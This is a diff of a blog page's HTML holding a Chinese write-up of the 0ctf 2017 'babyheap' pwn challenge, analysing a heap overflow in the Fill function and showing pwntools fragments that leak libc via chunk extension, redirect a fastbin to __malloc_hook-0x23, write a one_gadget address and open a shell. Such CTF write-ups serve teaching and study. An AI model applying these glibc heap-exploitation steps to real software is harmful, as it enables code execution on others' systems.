@@ -437,15 +437,15 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>这两天学习了一些堆的知识，趁热记录一下<br>首先还是熟练的checksec<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/1.jpg" alt><br>保护全开，堆题正常操作<br>IDA分析一波<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/2.jpg" alt><br>四个功能，增删查改<br>依次进入每个功能查看，首先是Allocate功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/3.jpg" alt><br>最大分配16个<br>size最大为4096个字节，通过calloc分配堆，calloc与malloc的区别在于<br>calloc 会将分配的内存空间每一位都初始化为0<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/4.jpg" alt><br>这三行代码分别代表flag位，分配即被置1；分配的字节大小；所分配的堆的指针<br>所以转换成结构体即为</p>
+                <p>这两天学习了一些堆的知识，趁热记录一下<br>首先还是熟练的checksec<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/1.jpg" alt=""><br>保护全开，堆题正常操作<br>IDA分析一波<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/2.jpg" alt=""><br>四个功能，增删查改<br>依次进入每个功能查看，首先是Allocate功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/3.jpg" alt=""><br>最大分配16个<br>size最大为4096个字节，通过calloc分配堆，calloc与malloc的区别在于<br>calloc 会将分配的内存空间每一位都初始化为0<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/4.jpg" alt=""><br>这三行代码分别代表flag位，分配即被置1；分配的字节大小；所分配的堆的指针<br>所以转换成结构体即为</p>
 <pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span><span class="token punctuation">{</span>
     <span class="token keyword">int</span> flag<span class="token punctuation">;</span>
     <span class="token keyword">int</span> lenth<span class="token punctuation">;</span>
     <span class="token keyword">char</span><span class="token operator">*</span>content<span class="token punctuation">;</span>
 <span class="token punctuation">}</span>note<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span></code></pre>
-<p>再看到Fill功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/5.jpg" alt><br>首先判断输入的index是否位于0到15之间并且是否被分配<br>如果是的话则输入content的size<br>漏洞点就在这里，程序并没有判断content的size是否小于我们之前输入的堆的size，如果我们输入更大的size，就可以造成堆溢出</p>
-<p>再看到Free功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/6.jpg" alt><br>一开始还是先判断是否存在<br>然后清零所有的数据，并且指针也置NULL<br>free功能并没有漏洞</p>
-<p>最后一个dump功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/7.jpg" alt><br>和上面一样，先判断，然后打印对应序号的堆的内容，没啥问题</p>
+<p>再看到Fill功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/5.jpg" alt=""><br>首先判断输入的index是否位于0到15之间并且是否被分配<br>如果是的话则输入content的size<br>漏洞点就在这里，程序并没有判断content的size是否小于我们之前输入的堆的size，如果我们输入更大的size，就可以造成堆溢出</p>
+<p>再看到Free功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/6.jpg" alt=""><br>一开始还是先判断是否存在<br>然后清零所有的数据，并且指针也置NULL<br>free功能并没有漏洞</p>
+<p>最后一个dump功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/7.jpg" alt=""><br>和上面一样，先判断，然后打印对应序号的堆的内容，没啥问题</p>
 <p>功能分析完后就开始分析漏洞点<br>Fill功能存在堆溢出漏洞，而free功能既没有UAF漏洞也没有double free漏洞，所以这题不能利用常规的通过unsorted bin来泄露libc地址的方法，而是要利用fastbin attack中的一种叫做chunk extend的方法来泄露地址，在这里贴上我看到的一个讲解的很好的链接<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698" target="_blank" rel="noopener">fastbin attack详解</a><br>首先把重复操作封装成函数</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
     io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>
@@ -491,7 +491,7 @@ fill<span class="token punctuation">(</span><span class="token number">0</span><
 <pre class=" language-python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>
 leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>dump<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>
-<p><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/8.jpg" alt><br>偏移为0x7f5a68c3db78-0x7f5a68879000=0x3C4B78‬</p>
+<p><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/8.jpg" alt=""><br>偏移为0x7f5a68c3db78-0x7f5a68879000=0x3C4B78‬</p>
 <pre class=" language-python"><code class="language-python">libc<span class="token operator">=</span>leak<span class="token number">-0x3c4b78</span>
 __malloc_hook<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x3c4b10</span>
 one_gadget<span class="token operator">=</span>libc<span class="token operator">+</span><span class="token number">0x4526a</span>
@@ -504,12 +504,12 @@ log<span class="token punctuation">.</span>info<span class="token punctuation">(
 最常见也是最容易的一种堆利用方法。
 malloc函数会首先检查malloc_hook的值，若不为0则会调用他。若我们能通过内存写入malloc_hook即可实现任意地址跳转
 通过fastbin_attack攻击malloc_hook</code></pre>
-<p>观察一下malloc_hook周围的数据的分布<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/9.jpg" alt><br>似乎并没有满足条件fastbin条件的数据，但只要我们稍微调整一下数据分布，看到__malloc_hook-0x23<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/10.jpg" alt><br>7f正好满足fastbin大小的限制，如图所示<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/11.jpg" alt><br>补充好相应的知识以后，就可以开始构造了<br>我们再alloc一个0x60大小的4号堆，实际上4号堆和2号堆是公用的<br>然后free掉2号堆，这个时候bins如下<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/12.jpg" alt><br>我们再通过fill4号堆把2号堆的fd指针指向mallac_hook-0x23处</p>
+<p>观察一下malloc_hook周围的数据的分布<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/9.jpg" alt=""><br>似乎并没有满足条件fastbin条件的数据，但只要我们稍微调整一下数据分布，看到__malloc_hook-0x23<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/10.jpg" alt=""><br>7f正好满足fastbin大小的限制，如图所示<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/11.jpg" alt=""><br>补充好相应的知识以后，就可以开始构造了<br>我们再alloc一个0x60大小的4号堆，实际上4号堆和2号堆是公用的<br>然后free掉2号堆，这个时候bins如下<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/12.jpg" alt=""><br>我们再通过fill4号堆把2号堆的fd指针指向mallac_hook-0x23处</p>
 <pre class=" language-python"><code class="language-python">alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
 free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
 payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>__malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>
 fill<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre>
-<p>看看现在的bins<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/13.jpg" alt><br>指向了<strong>malloc_hook-0x23处，我们只需要alloc2次，就能把堆分配到</strong>malloc_hook-0x23</p>
+<p>看看现在的bins<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/13.jpg" alt=""><br>指向了<strong>malloc_hook-0x23处，我们只需要alloc2次，就能把堆分配到</strong>malloc_hook-0x23</p>
 <pre class=" language-python"><code class="language-python">alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
 alloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span></code></pre>
 <p>接下来就只需要按照上面关于的<strong>malloc_hook的图进行填充即可，把one_gadget的地址填入</strong>malloc_hook处，然后再alloc任意大小的堆即可触发one_gadget从而拿到shell</p>
@@ -588,7 +588,7 @@ fill<span class="token punctuation">(</span><span class="token number">5</span><
 
 alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/14.jpg" alt><br>成功</p>
+<p><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/14.jpg" alt=""><br>成功</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -1002,7 +1002,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">7.2k</span>&nbsp;字
+                class="white-color">11.9k</span>&nbsp;字
             
             
             
